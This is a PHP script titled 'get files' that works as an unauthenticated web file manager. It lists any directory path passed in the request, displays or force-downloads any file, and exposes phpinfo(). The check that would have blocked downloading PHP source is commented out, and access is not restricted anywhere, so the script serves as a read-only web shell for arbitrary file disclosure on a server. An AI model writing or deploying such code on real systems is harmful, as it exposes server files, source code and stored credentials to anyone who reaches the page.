<?php 

$action = $_REQUEST['action']? $_REQUEST['action']:'';

if($action == 'php_info'){
	phpinfo();
	exit;
}
if($action == 'view_source'){
	$file = urldecode($_REQUEST['file']);
	if(empty($file) || !is_file($file)){
		die("<b>404 File not found!</b>"); 
	}
	$handle = fopen($file, "r");
	$contents = fread($handle, filesize ($file));
	
	echo "<pre>";
	echo htmlspecialchars($contents);
	exit;
	
}
if($action == 'download'){
	$file = urldecode($_REQUEST['file']);
	if(empty($file) || !is_file($file)){
		die("<b>404 File not found!</b>"); 
	}
	
	download_file($file);
	exit;

	
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>get files</title>
</head>
<body>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<?php
$doc_root = $_SERVER["DOCUMENT_ROOT"];

if($action == 'child_dir' && !empty($_REQUEST['file'])){
	$current_path = $_REQUEST['file'];
}else{
	$current_path = $doc_root;
}
//$current_path = preg_replace("/([^\\\]+)\\\{3,}([^\\\]+)/", "$1=$2", $current_path);
$files = getFilesInDir($current_path);
//echo $current_path;exit;

if(count($files) > 0){
	?>
	<table width="100%">
	<tr><th style="background:#bbb;" align="left">file name</th>
	<th style="background:#bbb;"  align="left">view source</th>
	<th style="background:#bbb;"  align="left">download</th>
	<th style="background:#bbb;"  align="left">file size/children path</th>
	<th style="background:#bbb;"  align="left">file last date</th>
	<th style="background:#bbb;"  align="left">file path</th>
	</tr>
	<?php foreach ($files as $file){
	$tmp_abs_file = $file['filepath'].$file['filename'];
	//echo $tmp_abs_file."<br>";
	$tmp_abs_file = preg_replace("/\\\+/", "\\", $tmp_abs_file);
	//echo $tmp_abs_file."<br>";exit;
		?>
	<tr onclick="this.style.backgroundColor='#ccc';if(window.cur_tr && window.cur_tr!=this) window.cur_tr.style.backgroundColor='#fff';window.cur_tr=this;" onmouseover="this.style.backgroundColor='#ccc'" onmouseout="if(!window.cur_tr || window.cur_tr!=this) this.style.backgroundColor='#fff'">
		<td width="10%"><?php 
		if(is_dir($tmp_abs_file)){
			echo '<b>'.$file['filename'].'</b>';
		}else{
			echo $file['filename'];
		}
		?></td>
		<td width="10%">
		<?php 
		if(!is_dir($tmp_abs_file)){?>
		<a href="?action=view_source&file=<?php echo urlencode($tmp_abs_file);?>" target="_blank" >view</a></td>
		<?php 	
		}
		?>
		<td width="10%">
		<?php 
		if(!is_dir($tmp_abs_file)){?>
		<a href="?action=download&file=<?php echo urlencode($tmp_abs_file);?>" target="_blank" >download</a>
		<?php 	
		}
		?>
		</td>
		<td width="20%"><?php 
		if(is_dir($tmp_abs_file)){
			echo "<a href='?action=child_dir&file=".urlencode($tmp_abs_file)."' target='_blank'>dir</a>";
		}else{
			echo $file['filesize'];
		}
		?></td>
		<td width="10%"><?php echo $file['filetime'];?></td>
		<td><?php echo $tmp_abs_file;?></td>

	</tr>
	<?php }?>
	</table>
	<?php
}

function resetDir($dir){
	if(DIRECTORY_SEPARATOR == '\\'){//windows's path separator
		$dir = str_replace('/', '\\', $dir);
	}
	if(preg_match("/\\|\/$/", $dir) == 0){
		if(DIRECTORY_SEPARATOR == '\\'){
			$dir = $dir . "\\";
		}else{
			$dir = $dir . "/";
		}
	}
	return $dir;
}
function getFilesInDir($dir){
	$dir = resetDir($dir);
	if(!is_dir($dir)){
		return array('not is dir');
	}
	
	$files = array();
	if ($handle = opendir($dir)) {
	    while (false !== ($file = readdir($handle))) {
	        if (1 || ($file != "." && $file != "..")) {
	        	$filename = $file;
	        	$filesize = filesize($dir.$file);
	        	$filetime = date ("Y-m-d H:i:s.", filemtime($dir.$file));
	            $files[] = array(
	            'filename'=>$filename,
	            'filesize'=>$filesize,
	            'filetime'=>$filetime,
	            'filepath'=>$dir
	            );
	        }
	    }
	    closedir($handle);
	}
	
	//array_multisort($files, SORT_DESC, $files);
	uasort($files, "sortFiles");
	
	return $files;
	
}
function sortFiles($a, $b){
	if ($a['filename'] == $b['filename']) {
        return 0;
    }
    return ($a['filename'] < $b['filename']) ? -1 : 1;
	
}

function download_file($file){

    //First, see if the file exists
    if (!is_file($file)) { die("<b>404 File not found!</b>"); }

    //Gather relevent info about file
    $len = filesize($file);
    $filename = basename($file);
    $file_extension = strtolower(substr(strrchr($filename,"."),1));

    //This will set the Content-Type to the appropriate setting for the file
    switch( $file_extension ) {
          case "pdf": $ctype="application/pdf"; break;
      case "exe": $ctype="application/octet-stream"; break;
      case "zip": $ctype="application/zip"; break;
      case "doc": $ctype="application/msword"; break;
      case "xls": $ctype="application/vnd.ms-excel"; break;
      case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
      case "gif": $ctype="image/gif"; break;
      case "png": $ctype="image/png"; break;
      case "jpeg":
      case "jpg": $ctype="image/jpg"; break;
      case "mp3": $ctype="audio/mpeg"; break;
      case "wav": $ctype="audio/x-wav"; break;
      case "mpeg":
      case "mpg":
      case "mpe": $ctype="video/mpeg"; break;
      case "mov": $ctype="video/quicktime"; break;
      case "avi": $ctype="video/x-msvideo"; break;

      //The following are for extensions that shouldn't be downloaded (sensitive stuff, like php files)
      case "php":
      case "htm":
      case "html":
     // case "txt": die("<b>Cannot be used for ". $file_extension ." files!</b>"); break;

      default: $ctype="application/force-download";
    }

    //Begin writing headers
    header("Pragma: public");
    header("Expires: 0");
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Cache-Control: public"); 
    header("Content-Description: File Transfer");
    
    //Use the switch-generated Content-Type
    header("Content-Type: $ctype");

    //Force the download
    $header="Content-Disposition: attachment; filename=".$filename.";";
    header($header );
    header("Content-Transfer-Encoding: binary");
    header("Content-Length: ".$len);
    @readfile($file);
    exit;
}

?>
</body>
</html>

